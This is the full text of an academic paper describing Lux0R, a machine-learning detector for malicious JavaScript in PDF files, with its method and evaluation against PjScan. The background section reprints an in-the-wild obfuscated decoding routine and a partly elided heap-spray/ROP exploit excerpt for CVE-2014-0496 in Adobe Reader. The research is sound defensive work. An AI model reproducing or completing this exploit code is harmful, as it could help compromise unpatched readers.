Lux0R: Detection of Malicious PDF-embedded JavaScript

code through Discriminant Analysis of API References

Igino Corona, Davide Maiorca, Davide Ariu, Giorgio Giacinto

Department of Electrical and Electronic Engineering

University of Cagliari

Piazza d’Armi 09123, Cagliari, Italy

ABSTRACT
JavaScript is a dynamic programming language adopted in
a variety of applications, including web pages, PDF Read-
ers, widget engines, network platforms, oﬃce suites. Given
its widespread presence throughout diﬀerent software plat-
forms, JavaScript is a primary tool for the development of
novel –rapidly evolving– malicious exploits.
If the classi-
cal signature- and heuristic-based detection approaches are
clearly inadequate to cope with this kind of threat, machine
learning solutions proposed so far suﬀer from high false-
alarm rates or require special instrumentation that make
them not suitable for protecting end-user systems.

In this paper we present Lux0R “Lux 0n discriminant Ref-
erences”, a novel, lightweight approach to the detection of
malicious JavaScript code. Our method is based on the
characterization of JavaScript code through its API refer-
ences, i.e., functions, constants, objects, methods, keywords
as well as attributes natively recognized by a JavaScript
Application Programming Interface (API). We exploit ma-
chine learning techniques to select a subset of API references
that characterize malicious code, and then use them to de-
tect JavaScript malware. The selection algorithm has been
thought to be “secure by design” against evasion by mimicry
attacks.
In this investigation, we focus on a relevant ap-
plication domain, i.e., the detection of malicious JavaScript
code within PDF documents. We show that our technique
is able to achieve excellent malware detection accuracy, even
on samples exploiting never-before-seen vulnerabilities, i.e.,
for which there are no examples in training data. Finally,
we experimentally assess the robustness of Lux0R against
mimicry attacks based on feature addition.

Categories and Subject Descriptors
C.2.0 [Computer-Communication Networks]: General—
Security and protection; I.5.1 [Pattern recognition]: Mod-
els—Statistical
 
Permission to make digital or hard copies of all or part of this work for personal 
or classroom use is granted without fee provided that copies are not made or 
distributed for profit or commercial advantage and that copies bear this notice 
and the full citation on the first page. Copyrights for components of this work 
owned  by  others  than  ACM  must  be  honored.  Abstracting  with  credit  is 
permitted. To copy otherwise, or republish, to post on servers or to redistribute 
to  lists,  requires  prior  specific  permission  and/or  a  fee.  Request  permissions 
from permissions@acm.org. 
AISec’14, November 7, 2014, Scottsdale, Arizona, USA. 
Copyright © 2014 ACM  978-1-4503-3153-1/14/11…$15.00. 
http://dx.doi.org/10.1145/2666652.2666657.

Keywords
JavaScript code; PDF documents; malware detection; ad-
versarial machine learning; mimicry attacks;

1.

INTRODUCTION

Though originally developed as a browser scripting lan-
guage, JavaScript is nowadays employed in a variety of ap-
plication domains. From a functional perspective, Java-
Script facilitates the development of user-friendly interfaces
with advanced functionalities. From a security perspective,
JavaScript is a powerful language that is widely adopted by
cyber-criminals to develop malicious exploits.

In this paper, we present a novel approach to the detec-
tion of malicious JavaScript code. We keep track of func-
tions, constants, objects, methods, keywords and attributes
referenced by JavaScript code, and use them to distinguish
between malicious and benign samples. In particular, we fo-
cus on API references, i.e., those references that are recog-
nized by a speciﬁc JavaScript API. We select only those that
characterize malicious code, according to a fully-automatic
discriminant analysis.
In this investigation, we focus on
JavaScript code embedded in PDF ﬁles, and thus refer to
the Acrobat JavaScript API [1].

Figure 1: Acrobat PDF reader vulnerabilities by
year.
http://www.cvedetails.com/product/
497/Adobe-Acrobat-Reader.html?vendor_id=53.

Source:

PDF documents constitute a relatively new – very power-
ful – way to disguise malicious code and compromise com-
puter systems. Albeit PDF exploits may target diﬀerent

47readers, Adobe Reader is the most targeted one. As shown
in Figure 1, Adobe Reader vulnerabilities have shown a huge
peak in 2010 and 2013 and still constitute a relevant threat.
Just between January and May 2014, 15 diﬀerent CVE en-
tries1 related to Adobe Reader exploits have been noticed,
almost all of them with very high impact on vulnerable
systems. PDF documents are also perfect candidates to
launch targeted attacks. As a recent example, in 2013 cyber-
criminal groups employed PDF ﬁles to successfully launch a
highly customized attack2 against multiple government en-
tities and institutions worldwide [17]. According to the Ac-
robat standard, PDF documents can embed many diﬀerent
kinds of content, and JavaScript code is the most diﬀused,
and perhaps the most threatening one3. In fact, most of ex-
ploits we have seen in the wild require the use of malicious
JavaScript code.

To cope with PDF threats a number of methods have been
proposed so far [14, 11, 31, 19, 22, 30, 32]. Some of them
focus on the analysis of the PDF structure, that initially
achieved excellent results [22, 30, 32], but recently have been
found very weak against mimicry evasion techniques [21].
Other techniques focus on the analysis of embedded Java-
Script code, through either heuristics, e.g., based on known
vulnerable functions [11], and shellcode detection [31], or
machine learning techniques, modeling code syntax and sus-
picious functions [19], or keeping track of typical operations
performed by malicious code [14]. Unfortunately, such solu-
tions are aﬀected by some relevant shortcomings. Heuristic-
based approaches [11, 31] have been found eﬀective only on a
very limited set of PDF malware samples, whereas learning-
based solutions are either characterized by very high false-
alarm rates [19], or not suitable for protecting end-user sys-
tems, as they require special instrumentation [14].

Diﬀerently from previous work, our technique is not driven
by prior knowledge about malware code. Instead, we keep
track of any API reference recognized by a JavaScript inter-
preter. Our observation is: since each API reference is re-
lated to speciﬁc functionalities/semantics, each occurrence
is somewhat linked to code behavior. Thus, we exploit ma-
chine learning techniques to automatically select API ref-
erences that best characterize malware code and then use
them to learn a malware detector. In this study, we show
that Lux0R is able to accurately detect JavaScript malware
within PDF documents, regardless the exploited vulnerabil-
ities, and even if no samples for the exploited vulnerabilities
are present in training data. We also test our system against
a mimicry evasion technique that may be carried out by a
motivated adversary.

Our system is lightweight and has an immediate appli-
cation for the real-time detection of PDF-embedded Java-
Script malware in end-user systems as well as low-interaction
honey-client systems. Moreover, as we will explain in Sec-
tion 2, its output can be useful for enhancing high-interaction
honey-clients, i.e., to perform a more accurate behavioral
analysis if suspicious code is detected.

Summarizing, in this work we provide the following main

contributions:

1CVE is the acronym of Common Vulnerabilities and Expo-
sures, see https://cve.mitre.org.
2A so-called Advanced Persistent Threat (APT).
3http://blogs.mcafee.com/mcafee-labs/analyzing-
the-first-rop-only-sandbox-escaping-pdf-exploit

• we present a novel –lightweight– method, based on ma-
chine learning, for accurately detecting malicious Java-
Script code through a discriminant analysis of API ref-
erences;

• we thoroughly evaluate the proposed method through

PDF malware collected in the wild;

• we show that the proposed method is capable of de-
tecting JavaScript-based exploits for which there are
no examples in training data, and is able to cope with
mimicry attacks that can be easily automated by an
adversary;

The paper is structured as follows. Section 2 presents
some background information about malicious JavaScript
embedded in PDF ﬁles that motivates our work. Section 3
presents the proposed system, whose evaluation is discussed
in Section 4. A discussion on the limits and possible im-
provements of our work is presented in Section 5. Section 6
presents an overview of related work. We conclude in Sec-
tion 7.

2. BACKGROUND

A JavaScript-based PDF malware is typically character-
ized by the following actions: (a) decoding: A decoding
routine extracts the exploit code, which is often encoded
(obfuscated) through ad-hoc algorithms and stored within
Adobe-speciﬁc objects. In this case, the exploit code may
not be observable (and thus detected) through static analy-
sis, e.g., signature matching, or even through runtime anal-
ysis that does not emulate the Adobe DOM (Document Ob-
ject Model). (b) ﬁngerprinting: The exploit code may
adapt its behavior according to (a ﬁngerprint of) the runtime
environment. This may be useful to: (1) focus only on vul-
nerabilities that are likely to aﬀect the current PDF reader
instance; (2) evade detection by dynamic analysis, e.g., ter-
minating its execution if the presence of an analysis environ-
ment is detected. (c) execution: If ﬁngerprint prerequi-
sites are met, the exploit is actually executed. Exploit code
may rely on one or multiple vulnerabilities and exploitation
techniques to successfully jeopardize a PDF reader and take
control of the whole Operating System.

In order to understand how these phases are implemented
in the wild, please refer to Examples 1 and 2. Example 1
shows a typical decoding routine that loads, decodes and
executes a malicious exploit put within a PDF Annota-
tion object4. In Example 1, the encoded exploit is loaded
through the method app.doc.getAnnots(). Then, the ex-
ploit is decoded through String methods split() and from-
CharCode() and saved within the variable buf. Finally, the
exploit is launched through the instruction app [’eval’]
(buf)5, since, if the PDF reader has at least two plugins
(if app.plugIns.length >= 2), the variable fnc is equal
to ’eval’ at the end of the computation.

var pr = null ;
var fnc = ’ ev ’;
var sum = ’ ’;
app . doc . s y n c A n n o t S c a n () ;
if ( app . plugIns . length != 0) {

4Annotation objects are normally used to store comments
within a PDF document [1].
5This instruction, according to the Adobe standard corre-
sponds to the ECMAScript [24] function eval(buf) [2].

48var num = 1;
pr = app . doc . g e t A n n o t s ({ nPage : 0}) ;
sum = pr [ num ]. subject ;

}
var buf = " " ;
if ( app . plugIns . length > 3) {

fnc += ’a ’;
var arr = sum . split (/ -/) ;
for ( var i = 1; i < arr . length ; i ++) {

buf += String . f r o m C h a r C o d e ( " 0 x " + arr [ i ]) ;

}
fnc += ’l ’;

}
if ( app . plugIns . length >= 2) { app [ fnc ]( buf ) ; }

Example 1: A malicious decoding routine.

Decoding routines, such as the above mentioned one, are
designed by cyber-criminals to make code behavior hard to
analyze without emulating Adobe API functionalities.
In
this case, the full exploit can be successfully extracted only
if a dynamic, Adobe API-aware analysis takes place.

Example 2 shows a possible output of the last instruc-
tion in Example 1, i.e., app [’eval’] (buf). It is an ex-
cerpt of (deobfuscated) malicious code exploiting CVE-2014-
04966 through heap-spray and return oriented programming
(ROP) techniques. Environmental ﬁngerprinting is done by
looking for the version of the PDF reader (through app.
viewerVersion). Depending on the resulting ﬁngerprint, a
diﬀerent exploit variant is employed (through the rop vari-
able). Then, the exploit is actually launched (if (vulner-
able) {...}).

f u n c t i o n h e a p S p r a y ( str , str_addr , r_addr ) {

var aaa = u n e s c a p e ( " % u0c0c " ) ;
aaa += aaa ;
while (( aaa . length + 24 + 4) < (0 x8000 + 0 x8000 ) )

aaa += aaa ;

var i1 = r_addr - 0 x24 ;
var bbb = aaa . s u b s t r i n g (0 , i1 / 2) ;
var sa = s t r _ a d d r ;
while ( sa . length < (0 x0c0c - r_addr ) ) sa += sa ;
bbb += sa ;
bbb += aaa ;
var i11 = 0 x0c0c - 0 x24 ;
bbb = bbb . s u b s t r i n g (0 , i11 / 2) ;
bbb += str ;
bbb += aaa ;
var i2 = 0 x4000 + 0 xc000 ;
var ccc = bbb . s u b s t r i n g (0 , i2 / 2) ;
while ( ccc . length < (0 x40000 + 0 x40000 ) ) ccc += ccc

;

var i3 = (0 x1020 - 0 x08 ) / 2;
var ddd = ccc . s u b s t r i n g (0 , 0 x80000 - i3 ) ;
var eee = new Array () ;
for ( i = 0; i < 0 x1e0 + 0 x10 ; i ++) eee [ i ] = ddd + "

s " ;
return ;

}
var s h e l l c o d e = u n e s c a p e ( " % uc7db % [ omitted ] % u4139 " ) ;
var e x e c u t a b l e = " " ;
var rop9 = u n e s c a p e ( " % u313d [ omitted ] % u4a81 " ) ;
var rop10 = u n e s c a p e ( " % u6015 [ omitted ] % u4a81 " ) ;
var rop11 = u n e s c a p e ( " % u822c [ omitted ] % u4a81 " ) ;
var r11 = false ;
var v u l n e r a b l e = true ;
var o b j _ s i z e ;
var rop ;
var r e t _ a d d r ;
var r o p _ a d d r ;
var r_addr ;

if ( app . v i e w e r V e r s i o n >= 9 && app . v i e w e r V e r s i o n < 10

&& app . v i e w e r V e r s i o n <= 9.504) {

6Use-after-free vulnerability in Adobe Reader and Acrobat
10.x before 10.1.9 and 11.x before 11.0.06 on Windows and
Mac OS X.

o b j _ s i z e = 0 x330 + 0 x1c ;
rop = rop9 ;
r e t _ a d d r = u n e s c a p e ( " % ua83e % u4a82 " ) ;
r o p _ a d d r = u n e s c a p e ( " % u08e8 % u0c0c " ) ;
r_addr = 0 x08e8 ;

} else if ( app . v i e w e r V e r s i o n >= 10 && app .

v i e w e r V e r s i o n < 11 && app . v i e w e r V e r s i o n <=
10.106) {

o b j _ s i z e = 0 x360 + 0 x1c ;
rop = rop10 ;
r o p _ a d d r = u n e s c a p e ( " % u08e4 % u0c0c " ) ;
r_addr = 0 x08e4 ;
r e t _ a d d r = u n e s c a p e ( " % ua8df % u4a82 " ) ;

} else if ( app . v i e w e r V e r s i o n >= 11 && app .

v i e w e r V e r s i o n <= 11.002) {

r11 = true ;
o b j _ s i z e = 0 x370 ;
rop = rop11 ;
r o p _ a d d r = u n e s c a p e ( " % u08a8 % u0c0c " ) ;
r_addr = 0 x08a8 ;
r e t _ a d d r = u n e s c a p e ( " % u8003 % u4a84 " ) ;

} else { v u l n e r a b l e = false ; }

if ( v u l n e r a b l e ) {

var payload = rop + s h e l l c o d e ;
h e a p S p r a y ( payload , ret_addr , r_addr ) ;

var part1 = " " ;
if (! r11 ) { for ( i = 0; i < 0 x1c / 2; i ++) part1 +=

u n e s c a p e ( " % u4141 " ) ;}

part1 += r o p _ a d d r ;
var part2 = " " ;
var p a r t 2 _ l e n = o b j _ s i z e - part1 . length * 2;
for ( i = 0; i < p a r t 2 _ l e n / 2 - 1; i ++) part2 +=

u n e s c a p e ( " % u4141 " ) ;

var arr = new Array () ;

r e m o v e B u t t o n F u n c = f u n c t i o n () {

app . r e m o v e T o o l B u t t o n ({

cName : " evil "

}) ;

for ( i = 0; i < 10; i ++) arr [ i ] = part1 . concat (

part2 ) ;

}

a d d B u t t o n F u n c = f u n c t i o n () {

app . a d d T o o l B u t t o n ({

cName : " xxx " ,
cExec : " 1 " ,
cEnable : " r e m o v e B u t t o n F u n c () ; "

}) ;

}
app . a d d T o o l B u t t o n ({

cName : " evil " ,
cExec : " 1 " ,
cEnable : " a d d B u t t o n F u n c () ; "

}) ;

}

Example 2: CVE-2014-0496 JavaScript exploit.

Examples 1 and 2 clearly show that the concurrent pres-
ence of diﬀerent API references makes the analysis of PDF-
embedded JavaScript malware an intrinsically diﬃcult task.
However, such aspect can be turned to our advantage if we
observe that code behavior is somewhat linked to its set of
API references. Hence, they may be useful to highlight Java-
Script malware across all phases (a,b,c) toward its malicious
goals. Additionally, some references may appear extensively
within JavaScript code. For instance, a runtime analysis of
the exploit in Example 2 allows one to see that functions
such as unescape or String.concat and attributes such as
String.lenght may be employed up to thousand times (see
the various for cycles). On the other hand, such API refer-
ences may be needed by malware developers to implement
the various exploit phases described earlier. Finally, it is

49worth noting that some API references may be also useful to
perform a more thorough analysis of malware behavior. For
instance, to perform an accurate behavioral analysis of Ex-
ample 2, a high-interaction honey-client module may focus
on the instantiation of speciﬁc Adobe Reader versions, by
looking for references to the app.viewerVersion attribute.
Our idea is thus to translate JavaScript code into an API
reference pattern, counting the number of times a certain
API reference appears from both static and dynamic anal-
ysis of JavaScript code. Our objective is to automatically
determine what references characterize malware code the
most (and benign code, the less), and use them as features
for malware detection.

3. LUX0R

No matter what kind of malicious actions are performed
by JavaScript code:
in a way or another, it should refer-
ence some set of objects, methods/functions, and attributes
natively recognized by the Javascript interpreter. Our in-
tuition is that malicious code should reference them with
patterns substantially diﬀerent from those observed in legit-
imate code. The proposed system aims at modeling and dis-
tinguishing between malicious and legitimate API reference
patterns, through a fully automated process. As depicted in
Figure 2, our system is structured into three main modules,
whose tasks are as follows.

API reference extraction The PDF document undergoes
an analysis process that extracts all API references
that appear from both static and runtime analysis of
embedded JavaScript code (§3.1).

API reference selection Only API references that char-
acterize malicious samples are selected (suspicious API
references). A reference pattern is built computing
the number of times each selected API is employed
by JavaScript code (§3.2).

Classiﬁcation The reference pattern is classiﬁed as either
legitimate or malicious through an accurate detection
model (§3.3). If malicious code is detected, the whole
set of (suspicious) API references can be forwarded to
a human operator for further inspection, or employed
to automatically setup a high-interaction honey-client
for a thorough behavioral analysis.

The set of malicious API references Φ, as well as the detec-
tion model, are inferred through a fully automated machine
learning process. In the following, the set of documents em-
ployed during the learning phase is referred to as training
dataset D and we indicate its cardinality |D| with N .
3.1 API reference extraction

As mentioned in Section 2, malicious JavaScript code may
be hidden through multiple levels of obfuscation relying on
Adobe-speciﬁc objects, methods and variables. Whereas
static analysis may highlight some suspicious API references,
e.g., those employed by the malicious decoding routine in
Example 1, a dynamic code analysis is necessary in order to
highlight also API references that come from runtime code
execution. To this end, we rely on PhoneyPDF7, a recently
proposed analysis framework speciﬁcally tailored to emulate

the Adobe DOM (Document Object Model). We instru-
mented PhoneyPDF in order to keep track of any API refer-
ence appearing from both static and dynamic code analysis.
It is worth noting that some previous work [14, 19, 31]
attempted to perform dynamic analysis using open-source
interpreters such as SpiderMonkey [26] or Rhino [25] (we
provide more details on §6). However, such interpreters
recognize the JavaScript ECMA [24] standard, and unless
Adobe DOM emulation take places, they are unable to in-
terpret JavaScript references that are speciﬁc to the Acrobat
PDF standard [1]. For instance, such interpreters would
completely fail to execute the code in Example 1, since
a number of references such as app.doc.syncAnnotScan(),
app.plugIns.length, app.doc.getAnnots(), are not recog-
nized by the JavaScript ECMA standard.
3.2 API Reference Selection

We select only a subset Φ of API references that character-
ize malicious JavaScript code, and use them for building an
API reference pattern. Our system is able to automatically
build such a set using a sample D of PDF documents whose
class, benign or malicious, is known. Let us deﬁne R as
the set of JavaScript objects, methods, attributes, functions,
and constants recognized by the Acrobat PDF API8 [1], Ψi
as the set of all JavaScript objects, methods, attributes,
functions, and constants referenced by the i-th PDF doc-
ument in D, m and b, respectively, the number of malicious
and benign PDF documents in D (i.e., m + b = N ), and
class(i) as a function which returns the known class of the
i-th document (i.e., benign or malicious). The feature set Φ
is given by all the references r ∈ R such that

φ(r, i) > t

(1)

where t ∈ [0, 1] is a discriminant threshold, and φ(r, i) is
deﬁned as follows

N(cid:88)

i=0

 +1/m

−1/b
0

φ(r, i) =

if r ∈ Ψi and class(i)=malicious
if r ∈ Ψi and class(i)=benign

otherwise

In practice, Φ is composed of API references whose pres-
ence is more frequent in malicious than benign PDF ﬁles by
a factor of t. The threshold t is a parameter in our evalua-
tion, and should be chosen in order to reﬂect a good tradeoﬀ
between classiﬁcation accuracy and robustness against eva-
sion by mimicry attacks (see §4.4). As we will see in Section
4, we found that diﬀerent choices for t may have negligible
eﬀect on malware detection accuracy, but relevant eﬀect on
classiﬁcation robustness.
3.3 Classiﬁcation

For each API reference selected in the previous phase,
we count the number of times it is employed by JavaScript
code. This way, we build an API reference pattern (i.e.,
a vector), and submit it to a classiﬁer which labels it as
either benign or malicious. We deliberately adopted such
a simple pattern representation in order to (a) make our
system suitable for real-time detection and (b) make API
reference patterns understandable by a human operator.

Analogously to the previous phase, the classiﬁer is built
using a sample of PDF documents whose label (benign or

7https://github.com/smthmlk/phoneypdf

8In this work, we were able to identify 3,272 API references.

50Figure 2: Architecture of Lux0R

malicious) is known. This phase aims to ﬁnd a general
model to accurately discriminate between malicious and be-
nign API reference patterns. Let us consider C as the set
of classiﬁcation algorithms to be evaluated. For each one
of them, we estimate its “optimal” parameters, i.e., those
which provide the best classiﬁcation accuracy according to
a k-fold cross-validation on dataset D [18]. More in detail,
we randomly split dataset D into k disjunct portions: the
classiﬁer is trained on k− 1 portions of D (training portion),
whereas the remaining portion (testing portion) is used to
evaluate its accuracy. This experiment is repeated k times,
considering each time a diﬀerent testing portion. The aver-
age classiﬁcation accuracy over these k experiments is used
as an indication of the suitability of the classiﬁer’s parame-
ters [18]. Finally, we select the classiﬁcation algorithm show-
ing the best overall accuracy and use its optimal parameters
to build a new classiﬁer using the whole dataset D. This
classiﬁer is then used to perform malware detection.

4. EVALUATION

We trained and evaluated our system using both benign
and malicious PDF documents collected in the wild. In par-
ticular, we performed three main evaluations: (1) a statisti-
cal, (2) a CVE-based, and (3) an adversarial evaluation.

The statistical evaluation is aimed at estimating the aver-
age accuracy of our system and its statistical deviation under
operation, as well as the average amount of time needed to
process a PDF sample. To this end, we consider a large set
of PDF malware in the wild exploiting vulnerabilities that
may be either known or unknown. We repeatedly split the
dataset into two parts: one portion is used to train the sys-
tem, whereas the other one is employed to test its accuracy
on never-before-seen PDF samples. During this process, we
always keep track of the elapsed time.

On the other hand, the CVE-based evaluation aims to
estimate to what extent our system is able to predict and
detect new classes of PDF exploits. To this end, we only
consider PDF malware samples whose exploited vulnerabil-
ities (CVE references) are known [23]. We train our system
on PDF malware exploiting vulnerabilities discovered until a
speciﬁc date, then we estimate its accuracy on malware sam-
ples exploiting vulnerabilities discovered after such a date.
Finally, the adversarial evaluation aims to test whether
our system is able to cope with an adversary who aims to
evade detection. In all evaluations we also rely on a large
set of benign PDF ﬁles.

4.1 Dataset

The dataset is made up of 17,782 unique PDF documents

embedding JavaScript code: 12,548 malicious samples (Mgen),
and 5,234 benign samples (B). The whole dataset is the
result of an extensive collection of PDF ﬁles from security
blogs such as Contagio9, Malware don’t need Coffee10, anal-
ysis engines such as VirusTotal11, search engines such as
Google and Yahoo. It is easy to see that the benign class
is undersampled with respect to the malicious one. In fact,
albeit JavaScript code is a typical feature of malicious PDF
ﬁles, it is relatively rare within benign PDF ﬁles12. We were
also able to identify a subset Mcve ⊂ Mgen composed of
10,014 malware samples whose exploited vulnerabilities are
known (see Table 1)13.

Dataset Validation and Ground Truth.

We validated the class of PDF samples in Mgen and B
employing VirusTotal [13] and Wepawet [14]. VirusTotal
is a web service capable to automatically analyze a ﬁle with
more than forty (updated) antivirus systems, among the
most popular ones. Wepawet is a web service capable of
extracting and analyzing JavaScript code embedded in PDF
documents, through both signature matching and machine
learning techniques. Notably, when JavaScript code matches
a known malware signature, Wepawet may also provide in-
formation about the exploited vulnerabilities through the
related CVE references.

We built Mgen so that each sample within such a set was
detected by at least 10 diﬀerent antivirus systems, accord-
ing to VirusTotal. We consider this threshold as reasonably
high to conclude that each PDF sample in Mgen is a valid
malware instance. In particular, we veriﬁed the CVE ref-
erence of each sample in Mcve exploiting the Wepawet API,
through a semi-automated process.

On the other hand, we built B so that each sample within
this set was ﬂagged at most by one antivirus system accord-

9http://contagiodump.blogspot.it
10http://malware.dontneedcoffee.com
11https://www.virustotal.com
12From search engines only, we retrieved more than 10 mil-
lions of unique PDF samples, using carefully crafted key-
words to increase the chance of collecting (benign) PDF ﬁles
embedding JavaScript content.
13Please note that the number of CVE references is larger
than the cardinality of Mcve, because a single malicious PDF
document might exploit multiple vulnerabilities.

classifierbenignmaliciousAPI reference extractionAPI reference selectionlearning-based modelruntime analysisknown labelJavaScriptAPI referencesSuspiciousreferences51ing to VirusTotal, and was never ﬂagged by Wepawet. We
manually veriﬁed all samples in B receiving one alert (466
ﬁles): they were actually perfectly benign PDFs. It turned
out that Comodo antivirus (which is included in the list of
antivirus systems managed by VirusTotal) was using a sig-
nature that “naively” raised an alert whenever a PDF ﬁle
containing JavaScript code was found.
In our case, these
alerts were clearly false positives.

Table 1: Distribution of CVE references related to
samples in Mcve.

39
1
6
11
1
18
1

CVE Reference PDF Samples
CVE-2014-0496
CVE-2013-3346
CVE-2012-0775
CVE-2011-2462
CVE-2010-3654
CVE-2010-2883
CVE-2010-1297
CVE-2010-0188
CVE-2009-4324
CVE-2009-3459
CVE-2009-0927
CVE-2009-0837
CVE-2008-2992
CVE-2007-5659

1804
7665

869
273

4

1661

62

Getting Our Dataset.

In order to allow other researchers to compare and ver-
ify our results, we have published the sha256sum of each
sample pertaining to datasets Mgen, Mcve and B at the
following address: http://pralab.diee.unica.it/sites/
default/files/lux0r-dataset.zip. Such hashes can be
used to retrieve all PDF samples employed in our evalu-
ation, by means of the VirusTotal API. Additionally, for
samples in Mcve we also list the related CVE references.
4.2 Statistical Evaluation

The statistical evaluation is performed by randomly split-
ting PDF samples in Mgen and B into two disjunct portions.
A fraction of 70% PDFs is used to train Lux0R (training
split), whereas the remaining portion is used to evaluate its
classiﬁcation accuracy on new samples (testing split). Each
split contains samples pertaining to either malicious or be-
nign PDFs. The above process is repeated ﬁve times (runs)
to estimate average and standard deviation of the detector’s
accuracy.

In our evaluation, we compared our detector to PjScan [19].
To the best of our knowledge, with the exception of Wepawet
[14], this is the unique public available tool for the detection
of PDF-embedded JavaScript malware based on machine
learning algorithms. Please note, however, that comparing
Wepawet to our tool is not fair for two main reasons: (a)
most of Wepawet’s detected samples (i.e., 95.37%) are due
to signatures, i.e., those that allowed us to validate samples
in Mcve; (b) we have no control on Wepawet’s training data.
During our study we evaluated many diﬀerent values for
In

both the threshold t and the classiﬁcation algorithms.

particular, we evaluated three popular classiﬁcation algo-
rithms: Support Vector Machines (SVMs), Decision Trees
and Random Forests. Table 3 and Figure 3 show a sum-
mary of the classiﬁcation results obtained with t = 0.2 and
a Random Forests classiﬁcation algorithm with 10 trees and
maximum deep comprised between 30 and 100, but we found
very similar results for diﬀerent choices of number of trees
> 5, maximum deep > 100, and threshold t > 0. For the
cross-validation process we employed k = 3 folds. For PjS-
can we employed the same procedure described above, using
its default settings. However, benign samples pertaining to
the training split have not been considered, since PjScan
learns from malicious PDFs only. According to these re-
sults, Lux0R achieves a very high detection rate with almost
no false alarms, and a negligible standard deviation. Please
note that, in a real-world scenario, false positives would be
much lower (according to our data, by at least 3 orders of
magnitude) since, as mentioned in §4.1, benign PDF docu-
ments typically do not contain JavaScript code.

From table 3, it is easy to see that Lux0R substantially
outperforms PjScan both in terms of detection rate and in
terms of false positive rate. We explain these results by
highlighting some key weaknesses of PjScan, with respect
to our tool.

First, PjScan performs a static analysis of JavaScript code,
thus it may be easily defeated through code obfuscation (see
Example 1). Second, it analyzes JavaScript code focusing on
the syntax of malware code, that is not directly related to
code behavior. On the other hand, focusing on API ref-
erences allows us to perform a lightweight analysis that is
somewhat linked to code behavior, as shown in Examples 2
and 1. Finally, PjScan learns from malicious PDFs only.
Thus, it has no way to select discriminant features, in order
to achieve high accuracy. The set of benign JavaScript sam-
ples contains precious information that we exploit to achieve
high classiﬁcation accuracy.

It is worth noting that PjScan results in Table 3 are only
related to PDF documents it was able to analyze. In par-
ticular, we found that (on average) PjScan was not able to
analyze 11.8% of PDF malware samples and 47.29% of be-
nign samples within the testing splits of our dataset. This
behavior may be due to limits in the static analysis of PjS-
can, since malware exploiting advanced obfuscation tech-
niques and speciﬁc vulnerabilities (e.g., CVE-2010-0188 14)
were completely unobservable by the system. Thus, con-
sidering all submitted samples, the average detection rate
of PjScan would be actually 78.84%, with 0.31% of false
positives.

Processing time.

During the statistical evaluation, we kept track of the
time needed by PjScan and Lux0R to process a malicious
or benign PDF ﬁle, for both learning and classiﬁcation.15
In practice, for both tools, learning and classiﬁcation have
a negligible impact. Both tools require only few seconds to
learn from the whole dataset, and milliseconds to classify
a PDF sample. The great majority of processing time is
actually related to the PDF parsing process, that on PjS-

14http://blog.fortinet.com/
cve-2010-0188-exploit-in-the-wild
15We performed this evaluation on a machine with Intel Xeon
CPU E5-2630 2.30GHz, with 8 GB of RAM and hard disk
drive at 7200 rpm.

52can is performed through libPDFJS16, whereas on Lux0R is
based on PhoneyPDF (see §3.1). Table 2 summarizes our re-
sults. As it can be seen, both tools are clearly suitable for
real-time detection on end-user machines, even if PjScan is
a clear winner.
Indeed, emulating Adobe DOM allows to
perform a much thorough evaluation of PDF samples, and
this comes at a prize. It is easy to see that parsing benign
samples takes much more time than parsing malware sam-
ples. There is a good reason for this, since benign samples
typically contain much more objects (e.g., text, images and
so on), with respect to malware samples. That is, malware
samples in the wild typically contain only objects that are
necessary/useful to execute an exploit.

Table 2: Average processing time of PjScan and Lux0R
for samples in Mgen and B.

Detector

Mgen

B

Lux0R
PjScan

0.75 seconds/sample
0.08 seconds/sample

2.59 seconds/sample
0.917 seconds/sample

Table 3: Classiﬁcation Results according to the Sta-
tistical Evaluation.

Detector Detection Rate
99.27% (± 0.04%)
89.38% (± 5.87%)

Lux0R
PjScan

False Positive Rate
0.05% (± 0.02%)
0.58% (± 0.28%)

Figure 3: ROC curve of Lux0R for one of the ﬁve
runs performed on our dataset. The plot focuses on
DR>98% and FPR ≤1%.

16http://sf.net/p/libpdfjs

4.3 CVE-based Evaluation

The CVE-based evaluation is performed by splitting Mcve
into two disjunct portions. The ﬁrst portion is used to train
the system and it is composed of PDF malware exploiting
vulnerabilities discovered until a certain year Y17. The re-
maining portion is used to evaluate the detection accuracy
of the system against never-before-seen JavaScript exploits,
i.e., those exploiting vulnerabilities discovered after year Y.
Accordingly, we randomly split dataset B into two disjunct
portions. The ﬁrst one (70%) takes part in the learning
phase of the system, whereas the second one (30%) is used
to evaluate its false positive rate. We employed the same
learning parameters as in the statistical evaluation described
in Section 4.2, and averaged the detection results over ﬁve
runs.

Table 4 summarizes the classiﬁcation results obtained by
Lux0R and PjScan on the Mcve dataset18. Results in Table 4
are very interesting for a variety of reasons. First, it can be
seen that Lux0R is able to truly generalize, i.e., detect PDF
malware samples using features that are somewhat agnostic
to the speciﬁc vulnerability. This is a fundamental aspect
that may allow for detecting never-before-seen JavaScript
attacks. This result is in agreement with our discussion
in Section 2, where we identiﬁed four common phases for
JavaScript-based PDF exploits. In order to implement these
phases, malware samples need to employ some common API
references, regardless the exploited vulnerability. Think, for
instance, to String manipulation references (e.g, unescape,
substring, length, etc.), or Adobe-speciﬁc references (e.g.,
app.viewerVersion, app[’eval’], app.plugIns, etc.), typ-
ically employed to “obfuscate” malicious code, ﬁngerprint
the runtime environment, or implement exploitation tech-
niques.

Moreover, as in the statistical evaluation, Lux0R substan-
tially outperforms PjScan in terms of classiﬁcation accuracy.
In particular, when our detector was trained on PDF sam-
ples exploiting only CVE 2007-5659, more than 96% of mal-
ware samples exploiting other vulnerabilities, i.e. those dis-
covered from 2008 up to now, were detected, with very low
false-alarm rate (about 0.6%). As it can be seen, the Lux0R’s
accuracy tend to further improve, going forward in time.
Learning from samples exploiting vulnerabilities discovered
until 2009 allows Lux0R to detect all other malware samples,
including those exploiting the most recent CVE-2014-0496,
with a false-alarm rate of 0.44%. Finally, learning from sam-
ples exploiting vulnerabilities discovered until 2011 allows
Lux0R to detect all recent malware samples, with zero false
positives.

The behavior of PjScan seems somewhat inconsistent across

diﬀerent training-testing splits. For instance, the accuracy
decreases when malware samples exploiting vulnerabilities
discovered in 2009 are added to the training dataset. The
main reason for this behavior is that a signiﬁcant number
of samples, mostly related to CVE-2010-0188, could not be
analyzed by the tool, as mentioned in Section 4.2. In partic-
ular, the percentage of PDF malware samples which PjScan
is not able to process is 28%, 25.15% and 91.85% for testing

17Some PDF malware may exploit multiple vulnerabilities in
Table 1. For such samples, we consider the most recent CVE
reference.
18For simplicity, we do not display the standard deviation:
for both tools, it received values close to those obtained in
the statistical evaluation.

53Table 4: Classiﬁcation Results according to the
CVE-based evaluation.
